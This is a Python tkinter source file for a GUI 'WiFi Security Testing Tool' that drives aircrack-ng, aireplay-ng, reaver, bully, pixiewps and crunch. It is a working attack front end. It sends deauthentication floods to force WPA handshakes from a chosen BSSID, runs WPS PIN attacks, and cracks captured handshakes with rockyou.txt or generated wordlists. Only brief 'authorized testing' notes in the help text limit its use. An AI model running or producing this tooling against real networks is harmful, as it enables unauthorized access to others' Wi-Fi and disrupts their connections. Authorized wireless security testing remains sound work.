import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import subprocess
import threading
import os
import queue
import time
import glob
import re
import csv
from pathlib import Path
from datetime import datetime, timedelta

class WifiSecurityTool:
    def __init__(self, root):
        self.root = root
        self.root.title("WiFi Security Testing Tool")
        
        # Set window size and make it non-resizable for consistent layout
        self.root.geometry("1030x930")
        self.root.resizable(True, True)
        
        # Style configuration
        self.style = ttk.Style()
        self.style.configure('Action.TButton', padding=5, width=20)
        self.style.configure('Stop.TButton', padding=5, width=20)
        self.style.configure('Header.TLabel', font=('Helvetica', 12, 'bold'))
        
        # Variables
        self.interface_var = tk.StringVar(value="wlan0")
        self.bssid_var = tk.StringVar()
        self.channel_var = tk.StringVar()
        self.essid_var = tk.StringVar()
        self.output_path_var = tk.StringVar(value=str(Path.home() / "captures"))
        
        # Progress variables
        self.progress_var = tk.DoubleVar()
        self.time_remaining_var = tk.StringVar(value="Time remaining: 2:00")
        self.status_var = tk.StringVar(value="Ready")
        
        # Process tracking
        self.active_processes = {}
        self.scan_process = None
        self.capture_start_time = None
        self.capture_timer = None
        
        # Ensure capture directory exists
        os.makedirs(self.output_path_var.get(), exist_ok=True)
        
        # Create main container with padding
        self.main_container = ttk.Frame(self.root, padding="10")
        self.main_container.grid(row=0, column=0, sticky="nsew")
        
        # Configure grid
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        
        # Create GUI elements
        self.create_menu_bar()
        self.create_interface_frame()
        self.create_target_frame()
        self.create_actions_frame()
        self.create_progress_frame()
        self.create_output_area()
        self.create_status_bar()
        
        # Command queue for thread-safe operation
        self.cmd_queue = queue.Queue()
        
        # Output lock for thread safety
        self.output_lock = threading.Lock()
        
        # Check dependencies and root privileges
        self.check_requirements()
        
        # Start queue processing
        self.process_queue()

    def create_menu_bar(self):
        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)
        
        # File Menu
        file_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="Save Output", command=self.save_output)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.cleanup_and_exit)
        
        # Tools Menu
        tools_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        tools_menu.add_command(label="Install Dependencies", command=self.install_dependencies)
        tools_menu.add_command(label="Check Requirements", command=self.check_requirements)
        
        # Help Menu
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="Documentation", command=self.show_documentation)
        help_menu.add_command(label="About", command=self.show_about)

    def create_interface_frame(self):
        frame = ttk.LabelFrame(self.main_container, text="Interface Configuration", padding="5")
        frame.grid(row=0, column=0, sticky="ew", padx=5, pady=5)
        
        # Interface selection
        ttk.Label(frame, text="Interface:", style='Header.TLabel').grid(row=0, column=0, padx=5, pady=5)
        interface_combo = ttk.Combobox(frame, textvariable=self.interface_var, values=self.get_wireless_interfaces())
        interface_combo.grid(row=0, column=1, padx=5, pady=5)
        
        # Monitor mode controls
        monitor_frame = ttk.Frame(frame)
        monitor_frame.grid(row=1, column=0, columnspan=2, pady=5)
        
        ttk.Button(
            monitor_frame,
            text="Start Monitor Mode",
            command=self.start_monitor_mode,
            style='Action.TButton'
        ).grid(row=0, column=0, padx=5)
        
        ttk.Button(
            monitor_frame,
            text="Stop Monitor Mode",
            command=self.stop_monitor_mode,
            style='Action.TButton'
        ).grid(row=0, column=1, padx=5)

    def create_actions_frame(self):
        frame = ttk.LabelFrame(self.main_container, text="Actions", padding="5")
        frame.grid(row=2, column=0, sticky="ew", padx=5, pady=5)

        # Scanning actions
        scan_frame = ttk.Frame(frame)
        scan_frame.grid(row=0, column=0, pady=5)
    
        ttk.Button(scan_frame, text="Scan Networks", 
                command=self.start_network_scan, style='Action.TButton').grid(row=0, column=0, padx=5)
        ttk.Button(scan_frame, text="Stop Scan", 
                command=self.stop_network_scan, style='Action.TButton').grid(row=0, column=1, padx=5)

     # Handshake capture actions
        handshake_frame = ttk.Frame(frame)
        handshake_frame.grid(row=1, column=0, pady=5)

        ttk.Button(handshake_frame, text="Capture Handshake", 
                command=self.start_handshake_capture, style='Action.TButton').grid(row=0, column=0, padx=5)
        ttk.Button(handshake_frame, text="Stop Capture Handshake", 
               command=self.stop_handshake_capture, style='Stop.TButton').grid(row=0, column=1, padx=5)

        # WPS attack actions
        wps_frame = ttk.Frame(frame)
        wps_frame.grid(row=2, column=0, pady=5)

        ttk.Button(wps_frame, text="Start WPS Attack", 
                command=self.start_wps_attack, style='Action.TButton').grid(row=0, column=0, padx=5)
        ttk.Button(wps_frame, text="Stop WPS Attack", 
                command=self.stop_wps_attack, style='Stop.TButton').grid(row=0, column=1, padx=5)

        # Handshake cracking actions
        crack_frame = ttk.Frame(frame)
        crack_frame.grid(row=3, column=0, pady=5)

        ttk.Button(crack_frame, text="Start Crack Handshake", 
                command=self.start_handshake_crack, style='Action.TButton').grid(row=0, column=0, padx=5)
        ttk.Button(crack_frame, text="Stop Crack Handshake", 
                command=self.stop_handshake_crack, style='Stop.TButton').grid(row=0, column=1, padx=5)

    def create_target_frame(self):
        frame = ttk.LabelFrame(self.main_container, text="Target Network", padding="5")
        frame.grid(row=1, column=0, sticky="ew", padx=5, pady=5)
        
        # Target network details
        ttk.Label(frame, text="BSSID:", style='Header.TLabel').grid(row=0, column=0, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.bssid_var).grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(frame, text="Channel:", style='Header.TLabel').grid(row=0, column=2, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.channel_var).grid(row=0, column=3, padx=5, pady=5)
        
        ttk.Label(frame, text="ESSID:", style='Header.TLabel').grid(row=0, column=4, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.essid_var).grid(row=0, column=5, padx=5, pady=5)

    def create_progress_frame(self):
        frame = ttk.LabelFrame(self.main_container, text="Progress", padding="5")
        frame.grid(row=3, column=0, sticky="ew", padx=5, pady=5)
        
        self.progress_bar = ttk.Progressbar(
            frame,
            variable=self.progress_var,
            maximum=120,
            mode='determinate'
        )
        self.progress_bar.grid(row=0, column=0, sticky="ew", padx=5, pady=5)
        
        ttk.Label(
            frame,
            textvariable=self.time_remaining_var
        ).grid(row=0, column=1, padx=5, pady=5)
        
        frame.columnconfigure(0, weight=1)

    def create_output_area(self):
        frame = ttk.LabelFrame(self.main_container, text="Output", padding="5")
        frame.grid(row=4, column=0, sticky="nsew", padx=5, pady=5)
        
        # Configure grid weights
        frame.columnconfigure(0, weight=1)
        frame.rowconfigure(0, weight=1)
        
        # Create output text area with monospace font
        self.output_text = scrolledtext.ScrolledText(
            frame,
            height=20,
            width=120,
            font=('Courier', 10),
            background='black',
            foreground='white'
        )
        self.output_text.grid(row=0, column=0, sticky="nsew")

    def create_status_bar(self):
        status_bar = ttk.Label(
            self.main_container,
            textvariable=self.status_var,
            relief=tk.SUNKEN,
            padding="2"
        )
        status_bar.grid(row=5, column=0, sticky="ew", padx=5, pady=5)

    def get_wireless_interfaces(self):
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            interfaces = re.findall(r'(\w+)\s+IEEE', result.stdout)
            return interfaces or ['wlan0']
        except:
            return ['wlan0']

    def check_tool_installed(self, tool):
        try:
            subprocess.run(['which', tool], check=True, capture_output=True)
            return True
        except subprocess.CalledProcessError:
            return False

    def check_requirements(self):
        if os.geteuid() != 0:
            messagebox.showerror("Error", "This application needs to be run as root!")
            self.root.quit()
            return
            
        required_tools = ['aircrack-ng', 'reaver', 'bully', 'crunch']
        missing_tools = []
        
        for tool in required_tools:
            if not self.check_tool_installed(tool):
                missing_tools.append(tool)
        
        if missing_tools:
            response = messagebox.askyesno(
                "Missing Dependencies",
                f"The following tools are missing: {', '.join(missing_tools)}\n\n"
                "Would you like to install them now?"
            )
            
            if response:
                self.install_dependencies()
            else:
                self.root.quit()

    def install_dependencies(self):
        try:
            cmd = [
                'apt-get', 'install', '-y',
                'aircrack-ng', 'reaver', 'bully', 'crunch',
                'pixiewps', 'wireless-tools'
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            threading.Thread(
                target=self.monitor_process_output,
                args=(process,),
                daemon=True
            ).start()
            
            self.update_output("Installing dependencies...")
            
        except Exception as e:
            self.update_output(f"Error installing dependencies: {str(e)}")
            messagebox.showerror("Error", f"Failed to install dependencies: {str(e)}")

    def start_monitor_mode(self):
        interface = self.interface_var.get()
    
        try:
            result = subprocess.run(
                ['airmon-ng', 'start', interface],
                capture_output=True,
                text=True,
                check=True
            )
        
            if 'monitor mode enabled' in result.stdout or "monitor mode vif enabled" in result.stdout:
                new_interface = interface + 'mon' if 'mon' not in interface else interface
                self.interface_var.set(new_interface)
                self.update_output(f"Monitor mode enabled successfully on {new_interface}")
            else:
                raise Exception(f"Failed to enable monitor mode: {result.stdout}")
            
        except subprocess.CalledProcessError as e:
            self.update_output(f"Error enabling monitor mode: {e.stderr}")
            messagebox.showerror("Error", f"Failed to enable monitor mode: {e.stderr}")
        except Exception as e:
            self.update_output(f"Error: {str(e)}")
            messagebox.showerror("Error", f"Error: {str(e)}")

    def stop_monitor_mode(self):
        interface = self.interface_var.get()

        try:
            result = subprocess.run(
                ['airmon-ng', 'stop', interface],
                capture_output=True,
                text=True
            )

            if "monitor mode disabled" in result.stdout or "station mode vif enabled" in result.stdout:
                new_interface = interface.replace('mon', '')
                self.interface_var.set(new_interface)
                self.update_output(f"Monitor mode disabled successfully on {new_interface}")
            else:
                raise Exception(f"Unexpected output from airmon-ng:\n{result.stdout}")
            
        except subprocess.CalledProcessError as e:
            self.update_output(f"Error disabling monitor mode: {e.stderr}")
            messagebox.showerror("Error", f"Failed to disable monitor mode: {e.stderr}")
        except Exception as e:
            self.update_output(f"Error: {str(e)}")
            messagebox.showerror("Error", f"Error: {str(e)}")

    def start_network_scan(self):
        interface = self.interface_var.get()
        output_file = os.path.join(self.output_path_var.get(), "scan")
        
        try:
            self.stop_network_scan()
            
            cmd = [
                'airodump-ng',
                '-w', output_file,
                '--output-format', 'csv',
                interface
            ]
            
            self.scan_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            self.update_output("Network scan started...")
            
            threading.Thread(target=self.parse_scan_results, args=(output_file,), daemon=True).start()
            
        except Exception as e:
            self.update_output(f"Error starting scan: {str(e)}")
            messagebox.showerror("Error", f"Failed to start network scan: {str(e)}")

    def stop_network_scan(self):
        if self.scan_process:
            self.scan_process.terminate()
            self.scan_process = None
            self.update_output("Network scan stopped")

    def parse_scan_results(self, output_file):
        csv_file = output_file + "-01.csv"
        
        while self.scan_process and self.scan_process.poll() is None:
            try:
                if os.path.exists(csv_file):
                    with open(csv_file, 'r', encoding='utf-8') as f:
                        reader = csv.reader(f)
                        networks = []
                        reading_networks = False
                        
                        for row in reader:
                            if len(row) == 0:
                                continue
                                
                            if row[0].strip() == "BSSID":
                                reading_networks = True
                                continue
                                
                            if reading_networks and len(row) >= 14:
                                bssid = row[0].strip()
                                channel = row[3].strip()
                                power = row[8].strip()
                                essid = row[13].strip()
                                encryption = row[5].strip()
                                
                                networks.append(
                                    f"BSSID: {bssid} | "
                                    f"Channel: {channel} | "
                                    f"Power: {power} dBm | "
                                    f"Encryption: {encryption} | "
                                    f"ESSID: {essid}"
                                )
                        
                        if networks:
                            self.output_text.delete(1.0, tk.END)
                            self.output_text.insert(tk.END, "\n".join(networks))
                
                time.sleep(1)
                
            except Exception as e:
                self.update_output(f"Error parsing scan results: {str(e)}")
                break

    def start_handshake_capture(self):
        if not all([self.bssid_var.get(), self.channel_var.get()]):
            messagebox.showerror("Error", "Please select a target network first!")
            return
            
        try:
            output_file = os.path.join(self.output_path_var.get(), "handshake")
            
            cmd = [
                'airodump-ng',
                '-c', self.channel_var.get(),
                '--bssid', self.bssid_var.get(),
                '-w', output_file,
                self.interface_var.get()
            ]
            
            self.active_processes['handshake_capture'] = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            self.capture_start_time = datetime.now()
            self.update_capture_progress()
            
            threading.Thread(target=self.send_deauth, daemon=True).start()
            threading.Thread(target=self.verify_handshake, daemon=True).start()
            
            self.update_output("Handshake capture started (2-minute limit)...")
            
        except Exception as e:
            self.update_output(f"Error starting handshake capture: {str(e)}")
            messagebox.showerror("Error", f"Failed to start handshake capture: {str(e)}")

    def update_capture_progress(self):
        if self.capture_start_time:
            elapsed = datetime.now() - self.capture_start_time
            remaining = timedelta(minutes=2) - elapsed
            
            if remaining.total_seconds() <= 0:
                self.stop_handshake_capture()
                return
            
            self.progress_var.set(120 - remaining.total_seconds())
            
            minutes = int(remaining.total_seconds() // 60)
            seconds = int(remaining.total_seconds() % 60)
            self.time_remaining_var.set(f"Time remaining: {minutes}:{seconds:02d}")
            
            self.capture_timer = self.root.after(1000, self.update_capture_progress)

    def verify_handshake(self):
        last_checked_files = set()

        while self.active_processes.get('handshake_capture'):
            try:
                output_dir = self.output_path_var.get()
                cap_files = glob.glob(os.path.join(output_dir, "*.cap"))  # Get all .cap files
            
                if not cap_files:
                    self.update_output("No capture file found yet...")
                    time.sleep(1)
                    continue

            # Get the latest file by creation time
                latest_cap = max(cap_files, key=os.path.getctime)
            
                if latest_cap not in last_checked_files:
                    self.update_output(f"New capture file detected: {latest_cap}")
                    last_checked_files.add(latest_cap)
                
                print(f"Checking handshake in: {latest_cap}")

                # Run aircrack-ng to check for a handshake
                result = subprocess.run(
                    ['aircrack-ng', latest_cap],
                    capture_output=True,
                    text=True,
                    timeout=5
                )

                if "1 handshake" in result.stdout:
                    self.update_output("🔥 Handshake successfully captured! 🔥")
                    self.stop_handshake_capture()
                    break

                time.sleep(1)

            except Exception as e:
                self.update_output(f"Error verifying handshake: {str(e)}")
                break

    def send_deauth(self):
        try:
            cmd = [
                'aireplay-ng',
                '-0', '5',
                '-a', self.bssid_var.get(),
                self.interface_var.get()
            ]
            
            subprocess.run(cmd, check=True)
            self.update_output("Deauthentication packets sent")
            
        except Exception as e:
            self.update_output(f"Error sending deauth packets: {str(e)}")

    def stop_handshake_capture(self):
        if self.active_processes.get('handshake_capture'):
            self.active_processes['handshake_capture'].terminate()
            del self.active_processes['handshake_capture']
            
        if self.capture_timer:
            self.root.after_cancel(self.capture_timer)
            
        self.capture_start_time = None
        self.progress_var.set(0)
        self.time_remaining_var.set("Time remaining: 2:00")
        
        self.update_output("Handshake capture stopped")

    def start_wps_attack(self):
        if not self.bssid_var.get():
            messagebox.showerror("Error", "Please select a target network first!")
            return
            
        dialog = tk.Toplevel(self.root)
        dialog.title("WPS Attack Options")
        dialog.geometry("300x200")
        
        ttk.Button(
            dialog,
            text="Reaver",
            command=lambda: self.run_wps_attack('reaver')
        ).pack(pady=5)
        
        ttk.Button(
            dialog,
            text="Bully",
            command=lambda: self.run_wps_attack('bully')
        ).pack(pady=5)
        
        ttk.Button(
            dialog,
            text="Pixiewps",
            command=lambda: self.run_wps_attack('pixiewps')
        ).pack(pady=5)

    def run_wps_attack(self, tool):
        try:
            if tool == 'reaver':
                cmd = [
                    'reaver',
                    '-i', self.interface_var.get(),
                    '-b', self.bssid_var.get(),
                    '-c', self.channel_var.get(),
                    '-vv'
                ]
            elif tool == 'bully':
                cmd = [
                    'bully',
                    '-b', self.bssid_var.get(),
                    '-c', self.channel_var.get(),
                    '--pixiewps',
                    self.interface_var.get()
                ]
            elif tool == 'pixiewps':
                cmd = [
                    'reaver',
                    '-i', self.interface_var.get(),
                    '-b', self.bssid_var.get(),
                    '-K'
                ]
            
            self.stop_wps_attack()
            
            self.active_processes['wps_attack'] = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            threading.Thread(
                target=self.monitor_process_output,
                args=(self.active_processes['wps_attack'],),
                daemon=True
            ).start()
            
            self.update_output(f"Started {tool} attack...")
            
        except Exception as e:
            self.update_output(f"Error starting {tool} attack: {str(e)}")
            messagebox.showerror("Error", f"Failed to start {tool} attack: {str(e)}")

    def stop_wps_attack(self):
        if self.active_processes.get('wps_attack'):
            self.active_processes['wps_attack'].terminate()
            del self.active_processes['wps_attack']
            self.update_output("WPS attack stopped")

    def start_handshake_crack(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("Crack Handshake")
        dialog.geometry("300x200")
        
        ttk.Button(
            dialog,
            text="Use rockyou.txt",
            command=lambda: self.crack_handshake('rockyou')
        ).pack(pady=5)
        
        ttk.Button(
            dialog,
            text="Custom Wordlist",
            command=lambda: self.crack_handshake('custom')
        ).pack(pady=5)
        
        ttk.Button(
            dialog,
            text="Generate Wordlist",
            command=self.show_wordlist_generator
        ).pack(pady=5)

    def crack_handshake(self, wordlist_type):
        try:
            output_dir = self.output_path_var.get()
            cap_files = glob.glob(os.path.join(output_dir, "*.cap"))  # Get all .cap files

            if not cap_files:
                raise Exception("No handshake capture file found.")

        # Find the most recently created .cap file
            handshake_file = max(cap_files, key=os.path.getctime)  

            if wordlist_type == 'rockyou':
                wordlist = "/usr/share/wordlists/rockyou.txt"
            else:
                wordlist = filedialog.askopenfilename(
                    title="Select Wordlist",
                    filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
                )
            
            if not wordlist:
                return
            
            cmd = [
                'aircrack-ng',
                handshake_file,
                '-w', wordlist
            ]
        
            self.stop_handshake_crack()
        
            self.active_processes['crack'] = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
        
            threading.Thread(
                target=self.monitor_process_output,
                args=(self.active_processes['crack'],),
                daemon=True
            ).start()
        
            self.update_output(f"Started handshake cracking using: {handshake_file}")
        
        except Exception as e:
            self.update_output(f"Error starting handshake crack: {str(e)}")
            messagebox.showerror("Error", f"Failed to start handshake crack: {str(e)}")

    def stop_handshake_crack(self):
        if self.active_processes.get('crack'):
            self.active_processes['crack'].terminate()
            del self.active_processes['crack']
            self.update_output("Handshake cracking stopped")

    def show_wordlist_generator(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("Generate Wordlist")
        dialog.geometry("400x300")
        
        ttk.Label(dialog, text="Minimum Length:").pack(pady=5)
        min_length = ttk.Entry(dialog)
        min_length.pack(pady=5)
        
        ttk.Label(dialog, text="Maximum Length:").pack(pady=5)
        max_length = ttk.Entry(dialog)
        max_length.pack(pady=5)
        
        charset_var = tk.StringVar(value="numeric")
        ttk.Radiobutton(
            dialog,
            text="Numeric",
            variable=charset_var,
            value="numeric"
        ).pack(pady=2)
        
        ttk.Radiobutton(
            dialog,
            text="Alphabetic",
            variable=charset_var,
            value="alpha"
        ).pack(pady=2)
        
        ttk.Radiobutton(
            dialog,
            text="Alphanumeric",
            variable=charset_var,
            value="alnum"
        ).pack(pady=2)
        
        ttk.Button(
            dialog,
            text="Generate",
            command=lambda: self.generate_wordlist(
                min_length.get(),
                max_length.get(),
                charset_var.get()
            )
        ).pack(pady=10)

    def generate_wordlist(self, min_length, max_length, charset):
        try:
            min_len = int(min_length)
            max_len = int(max_length)
            
            if min_len < 1 or max_len < min_len:
                raise ValueError("Invalid length parameters")
            
            if charset == "numeric":
                chars = "0123456789"
            elif charset == "alpha":
                chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
            else:
                chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            
            output_file = os.path.join(self.output_path_var.get(), "wordlist.txt")
            
            cmd = [
                'crunch',
                str(min_len),
                str(max_len),
                chars,
                '-o', output_file
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            threading.Thread(
                target=self.monitor_process_output,
                args=(process,),
                daemon=True
            ).start()
            
            self.update_output(f"Generating wordlist to {output_file}...")
            
        except ValueError as e:
            messagebox.showerror("Error", str(e))
        except Exception as e:
            self.update_output(f"Error generating wordlist: {str(e)}")
            messagebox.showerror("Error", f"Failed to generate wordlist: {str(e)}")

    def monitor_process_output(self, process):
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                self.update_output(output.strip())

    def update_output(self, text):
        with self.output_lock:
            self.cmd_queue.put(text)

    def process_queue(self):
        try:
            while True:
                text = self.cmd_queue.get_nowait()
                self.output_text.insert(tk.END, str(text) + "\n")
                self.output_text.see(tk.END)
                self.cmd_queue.task_done()
        except queue.Empty:
            pass
        finally:
            self.root.after(100, self.process_queue)

    def save_output(self):
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    f.write(self.output_text.get(1.0, tk.END))
                messagebox.showinfo("Success", "Output saved successfully")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save output: {str(e)}")

    def show_documentation(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("Documentation")
        dialog.geometry("600x400")
        
        text = scrolledtext.ScrolledText(dialog, wrap=tk.WORD, padx=10, pady=10)
        text.pack(expand=True, fill="both")
        
        text.insert(tk.END, """
WiFi Security Testing Tool Documentation

1. Getting Started
   - Ensure you have root privileges
   - Connect a compatible wireless adapter
   - Enable monitor mode on your interface

2. Basic Usage
   a) Scanning Networks
      - Select your interface
      - Click "Scan Networks"
      - Wait for results to appear
   
   b) Capturing Handshakes
      - Select target network from scan results
      - Click "Capture Handshake"
      - Wait for deauth packets to be sent
   
   c) Cracking Handshakes
      - Choose a wordlist
      - Click "Crack Handshake"
      - Monitor progress in output window

3. Advanced Features
   - WPS Attacks (Reaver, Bully, Pixiewps)
   - Custom wordlist generation
   - Multiple attack methods

4. Troubleshooting
   - Ensure wireless adapter supports monitor mode
   - Check for missing dependencies
   - Verify root privileges
   - Monitor system logs for errors

Note: This tool should only be used for legal and authorized testing purposes.
""")
        text.config(state='disabled')

    def show_about(self):
        messagebox.showinfo(
            "About",
            "WiFi Security Testing Tool v1.0\n\n"
            "A comprehensive tool for wireless network security testing.\n\n"
            "Features:\n"
            "- Network scanning\n"
            "- Handshake capture\n"
            "- WPS attacks\n"
            "- Multiple cracking methods\n\n"
            "Note: Use only for authorized testing purposes."
        )

    def cleanup_and_exit(self):
        try:
            # Stop all active processes
            for process in self.active_processes.values():
                if process and process.poll() is None:
                    process.terminate()
            
            # Stop network scan if running
            self.stop_network_scan()
            
            # Stop handshake capture if running
            self.stop_handshake_capture()
            
            # Stop WPS attack if running
            self.stop_wps_attack()
            
            # Stop handshake cracking if running
            self.stop_handshake_crack()
            
            # Disable monitor mode if enabled
            interface = self.interface_var.get()
            if interface.endswith('mon'):
                self.stop_monitor_mode()
            
        except Exception as e:
            self.update_output(f"Error during cleanup: {str(e)}")
        finally:
            self.root.quit()

def main():
    root = tk.Tk()
    app = WifiSecurityTool(root)
    root.mainloop()

if __name__ == "__main__":
    main()